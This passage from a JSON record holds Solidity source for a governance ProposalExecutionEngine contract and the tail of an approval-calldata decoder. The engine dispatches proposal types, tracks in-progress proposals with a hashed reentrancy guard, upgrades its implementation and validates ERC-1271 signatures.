_decodeSetApprovalForAllCallDataArgs(\n        bytes memory callData\n    ) private pure returns (address operator, bool isApproved) {\n        if (callData.length < 68) {\n            revert InvalidApprovalCallLength(callData.length);\n        }\n        assembly {\n            operator := and(mload(add(callData, 36)), 0xffffffffffffffffffffffffffffffffffffffff)\n            isApproved := xor(iszero(mload(add(callData, 68))), 1)\n        }\n    }\n}"
    },
    {
      "filename": "contracts/proposals/ProposalExecutionEngine.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.20;\n\nimport \"../utils/Implementation.sol\";\nimport \"../utils/LibRawResult.sol\";\nimport \"../globals/IGlobals.sol\";\nimport { IERC1271 } from \"openzeppelin/contracts/interfaces/IERC1271.sol\";\n\nimport \"./IProposalExecutionEngine.sol\";\nimport \"./ListOnOpenseaProposal.sol\";\nimport \"./ListOnOpenseaAdvancedProposal.sol\";\nimport \"./ListOnZoraProposal.sol\";\nimport \"./FractionalizeProposal.sol\";\nimport \"./ArbitraryCallsProposal.sol\";\nimport \"./ProposalStorage.sol\";\nimport \"./DistributeProposal.sol\";\nimport \"./AddAuthorityProposal.sol\";\nimport \"./OperatorProposal.sol\";\nimport { SetSignatureValidatorProposal } from \"./SetSignatureValidatorProposal.sol\";\nimport { SetGovernanceParameterProposal } from \"./SetGovernanceParameterProposal.sol\";\n\n/// @notice Upgradable implementation of proposal execution logic for parties that use it.\n/// @dev This contract will be delegatecall'ed into by `Party` proxy instances.\ncontract ProposalExecutionEngine is\n    IProposalExecutionEngine,\n    Implementation,\n    ProposalStorage,\n    ListOnOpenseaProposal,\n    ListOnOpenseaAdvancedProposal,\n    ListOnZoraProposal,\n    FractionalizeProposal,\n    ArbitraryCallsProposal,\n    DistributeProposal,\n    AddAuthorityProposal,\n    OperatorProposal,\n    SetSignatureValidatorProposal,\n    SetGovernanceParameterProposal,\n    IERC1271\n{\n    using LibRawResult for bytes;\n\n    error UnsupportedProposalTypeError(uint32 proposalType);\n\n    // The types of proposals supported.\n    // The first 4 bytes of a proposal's `proposalData` determine the proposal\n    // type.\n    // WARNING: This should be append-only.\n    enum ProposalType {\n        Invalid,\n        ListOnOpensea,\n        ListOnZora,\n        Fractionalize,\n        ArbitraryCalls,\n        UpgradeProposalEngineImpl,\n        ListOnOpenseaAdvanced,\n        Distribute,\n        AddAuthority,\n        Operator,\n        SetSignatureValidatorProposal,\n        SetGovernanceParameterProposal\n    }\n\n    // Explicit storage bucket for \"private\" state owned by the `ProposalExecutionEngine`.\n    // See `_getStorage()` for how this is addressed.\n    //\n    // Read this for more context on the pattern motivating this:\n    // https://github.com/dragonfly-xyz/useful-solidity-patterns/tree/main/patterns/explicit-storage-buckets\n    struct Storage {\n        // The hash of the next `progressData` for the current `InProgress`\n        // proposal. This is updated to the hash of the next `progressData` every\n        // time a proposal is executed. This enforces that the next call to\n        // `executeProposal()` receives the correct `progressData`.\n        // If there is no current `InProgress` proposal, this will be 0x0.\n        bytes32 nextProgressDataHash;\n        // The proposal ID of the current, in progress proposal being executed.\n        // `InProgress` proposals need to have `executeProposal()` called on them\n        // multiple times until they complete. Only one proposal may be\n        // in progress at a time, meaning no other proposals can be executed\n        // if this value is nonzero.\n        uint256 currentInProgressProposalId;\n    }\n\n    event ProposalEngineImplementationUpgraded(address oldImpl, address newImpl);\n\n    error ProposalDisabled(ProposalType proposalType);\n    error ZeroProposalIdError();\n    error MalformedProposalDataError();\n    error ProposalExecutionBlockedError(uint256 proposalId, uint256 currentInProgressProposalId);\n    error ProposalProgressDataInvalidError(\n        bytes32 actualProgressDataHash,\n        bytes32 expectedProgressDataHash\n    );\n    error ProposalNotInProgressError(uint256 proposalId);\n    error UnexpectedProposalEngineImplementationError(\n        IProposalExecutionEngine actualImpl,\n        IProposalExecutionEngine expectedImpl\n    );\n\n    // The `Globals` contract storing global configuration values. This contract\n    // is immutable and itâ€™s address will never change.\n    IGlobals private immutable _GLOBALS;\n    // Storage slot for `Storage`.\n    // Use a constant, non-overlapping slot offset for the storage bucket.\n    uint256 private constant _STORAGE_SLOT = uint256(keccak256(\"ProposalExecutionEngine.Storage\"));\n\n    // Set immutables.\n    constructor(\n        IGlobals globals,\n        IReserveAuctionCoreEth zora,\n        IFractionalV1VaultFactory fractionalVaultFactory\n    )\n        ListOnOpenseaAdvancedProposal(globals)\n        ListOnZoraProposal(globals, zora)\n        FractionalizeProposal(fractionalVaultFactory)\n        ArbitraryCallsProposal(zora)\n    {\n        _GLOBALS = globals;\n    }\n\n    /// @notice Used by `Party` to setup the execution engine.\n    /// @param oldImpl The previous implementation address.\n    /// @param initializeData The data to use to initialize the execution engine.\n    function initialize(\n        address oldImpl,\n        bytes calldata initializeData\n    ) external override onlyDelegateCall {\n        // Prevent old parties from configuring new options to maintain security guarantees.\n        if (oldImpl != address(0)) return;\n\n        // If there is no initialize data, there is nothing to do.\n        if (initializeData.length == 0) return;\n\n        ProposalEngineOpts memory opts = abi.decode(initializeData, (ProposalEngineOpts));\n\n        // Set proposal engine opts\n        _getSharedProposalStorage().opts = opts;\n    }\n\n    /// @notice Get the current `InProgress` proposal ID.\n    /// @dev With this version, only one proposal may be in progress at a time.\n    function getCurrentInProgressProposalId() external view returns (uint256 id) {\n        return _getStorage().currentInProgressProposalId;\n    }\n\n    /// @inheritdoc IProposalExecutionEngine\n    function executeProposal(\n        ExecuteProposalParams memory params\n    ) external onlyDelegateCall returns (bytes memory nextProgressData) {\n        // Must have a valid proposal ID.\n        if (params.proposalId == 0) {\n            revert ZeroProposalIdError();\n        }\n        Storage storage stor = _getStorage();\n        uint256 currentInProgressProposalId = stor.currentInProgressProposalId;\n        if (currentInProgressProposalId == 0) {\n            // No proposal is currently in progress.\n            // Mark this proposal as the one in progress.\n            stor.currentInProgressProposalId = params.proposalId;\n        } else if (currentInProgressProposalId != params.proposalId) {\n            // Only one proposal can be in progress at a time.\n            revert ProposalExecutionBlockedError(params.proposalId, currentInProgressProposalId);\n        }\n        {\n            bytes32 nextProgressDataHash = stor.nextProgressDataHash;\n            if (nextProgressDataHash == 0) {\n                // Expecting no progress data.\n                // This is the state if there is no current `InProgress` proposal.\n                assert(currentInProgressProposalId == 0);\n                if (params.progressData.length != 0) {\n                    revert ProposalProgressDataInvalidError(\n                        keccak256(params.progressData),\n                        nextProgressDataHash\n                    );\n                }\n            } else {\n                // Expecting progress data.\n                bytes32 progressDataHash = keccak256(params.progressData);\n                // Progress data must match the one stored.\n                if (nextProgressDataHash != progressDataHash) {\n                    revert ProposalProgressDataInvalidError(progressDataHash, nextProgressDataHash);\n                }\n            }\n            // Temporarily set the expected next progress data hash to an\n            // unachievable constant to act as a reentrancy guard.\n            stor.nextProgressDataHash = bytes32(type(uint256).max);\n        }\n\n        // Note that we do not enforce that the proposal has not been executed\n        // (and completed) before in this contract. That is enforced by PartyGovernance.\n\n        // Execute the proposal.\n        ProposalType pt;\n        (pt, params.proposalData) = _extractProposalType(params.proposalData);\n        nextProgressData = _execute(pt, params);\n\n        // If progress data is empty, the proposal is complete.\n        if (nextProgressData.length == 0) {\n            stor.currentInProgressProposalId = 0;\n            stor.nextProgressDataHash = 0;\n        } else {\n            // Remember the next progress data.\n            stor.nextProgressDataHash = keccak256(nextProgressData);\n        }\n    }\n\n    /// @inheritdoc IProposalExecutionEngine\n    function cancelProposal(uint256 proposalId) external onlyDelegateCall {\n        // Must be a valid proposal ID.\n        if (proposalId == 0) {\n            revert ZeroProposalIdError();\n        }\n        Storage storage stor = _getStorage();\n        {\n            // Must be the current InProgress proposal.\n            uint256 currentInProgressProposalId = stor.currentInProgressProposalId;\n            if (currentInProgressProposalId != proposalId) {\n                revert ProposalNotInProgressError(proposalId);\n            }\n        }\n        // Clear the current InProgress proposal ID and next progress data.\n        stor.currentInProgressProposalId = 0;\n        stor.nextProgressDataHash = 0;\n    }\n\n    function isValidSignature(bytes32 hash, bytes memory signature) external view returns (bytes4) {\n        IERC1271 validator = getSignatureValidatorForHash(hash);\n        if (address(validator) == address(1)) {\n            // Signature set by party to be always valid\n            return IERC1271.isValidSignature.selector;\n        }\n        if (address(validator) != address(0)) {\n            return validator.isValidSignature(hash, signature);\n        }\n        if (tx.origin == address(0)) {\n            validator = getSignatureValidatorForHash(0);\n            if (address(validator) == address(0)) {\n                // Use global off-chain signature validator\n                validator = IERC1271(\n                    _GLOBALS.getAddress(LibGlobals.GLOBAL_OFF_CHAIN_SIGNATURE_VALIDATOR)\n                );\n            }\n            return validator.isValidSignature(hash, signature);\n        }\n        return 0;\n    }\n\n    // Switch statement used to execute the right proposal.\n    function _execute(\n        ProposalType pt,\n        ExecuteProposalParams memory params\n    ) internal virtual returns (bytes memory nextProgressData) {\n        if (pt == ProposalType.ListOnOpensea) {\n            nextProgressData = _executeListOnOpensea(params);\n        } else if (pt == ProposalType.ListOnOpenseaAdvanced) {\n            nextProgressData = _executeListOnOpenseaAdvanced(params);\n        } else if (pt == ProposalType.ListOnZora) {\n            nextProgressData = _executeListOnZora(params);\n        } else if (pt == ProposalType.Fractionalize) {\n            nextProgressData = _executeFractionalize(params);\n        } else if (pt == ProposalType.ArbitraryCalls) {\n            nextProgressData = _executeArbitraryCalls(\n                params,\n                _getSharedProposalStorage().opts.allowArbCallsToSpendPartyEth\n            );\n        } else if (pt == ProposalType.Distribute) {\n            if (!_getSharedProposalStorage().opts.distributionsRequireVote) {\n                revert ProposalDisabled(pt);\n            }\n\n            nextProgressData = _executeDistribute(params);\n        } else if (pt == ProposalType.AddAuthority) {\n            if (!_getSharedProposalStorage().opts.enableAddAuthorityProposal) {\n                revert ProposalDisabled(pt);\n            }\n\n            nextProgressData = _executeAddAuthority(params);\n        } else if (pt == ProposalType.Operator) {\n            if (!_getSharedProposalStorage().opts.allowOperators) {\n                revert ProposalDisabled(pt);\n            }\n\n            nextProgressData = _executeOperation(params);\n        } else if (pt == ProposalType.SetSignatureValidatorProposal) {\n            nextProgressData = _executeSetSignatureValidator(params);\n        } else if (pt == ProposalType.SetGovernanceParameterProposal) {\n            nextProgressData = _executeSetGovernanceParameter(params);\n        } else if (pt == ProposalType.UpgradeProposalEngineImpl) {\n            _executeUpgradeProposalsImplementation(params.proposalData);\n        } else {\n            revert UnsupportedProposalTypeError(uint32(pt));\n        }\n    }\n\n    // Destructively pops off the first 4 bytes of `proposalData` to determine\n    // the type. This modifies `proposalData` and returns the updated\n    // pointer to it.\n    function _extractProposalType(\n        bytes memory proposalData\n    ) private pure returns (ProposalType proposalType, bytes memory offsetProposalData) {\n        // First 4 bytes is proposal type. While the proposal type could be\n        // stored in just 1 byte, this makes it easier to encode with\n        // `abi.encodeWithSelector`.\n        if (proposalData.length < 4) {\n            revert MalformedProposalDataError();\n        }\n        assembly {\n            // By reading 4 bytes into the length prefix, the leading 4 bytes\n            // of the data will be in the lower bits of the read word.\n            proposalType := and(mload(add(proposalData, 4)), 0xffffffff)\n            mstore(add(proposalData, 4), sub(mload(proposalData), 4))\n            offsetProposalData := add(proposalData, 4)\n        }\n        require(proposalType != ProposalType.Invalid);\n        require(uint8(proposalType) <= uint8(type(ProposalType).max));\n    }\n\n    // Upgrade implementation to the latest version.\n    function _executeUpgradeProposalsImplementation(bytes memory proposalData) private {\n        (address expectedImpl, bytes memory initData) = abi.decode(proposalData, (address, bytes));\n        // Always upgrade to latest implementation stored in `_GLOBALS`.\n        IProposalExecutionEngine newImpl = IProposalExecutionEngine(\n            _GLOBALS.getAddress(LibGlobals.GLOBAL_PROPOSAL_ENGINE_IMPL)\n        );\n        if (expectedImpl != address(newImpl)) {\n            revert UnexpectedProposalEngineImplementationError(\n                newImpl,\n                IProposalExecutionEngine(expectedImpl)\n            );\n        }\n        _initProposalImpl(newImpl, initData);\n        emit ProposalEngineImplementationUpgraded(address(implementation), expectedImpl);\n    }\n\n    // Retrieve the explicit storage bucket for the ProposalExecutionEngine logic.\n    function _getStorage() internal pure returns (Storage storage stor) {\n        uint256 slot = _STORAGE_SLOT;\n        assembly {\n            stor.slot := slot\n        }\n    }\n}"
    }
  ]
}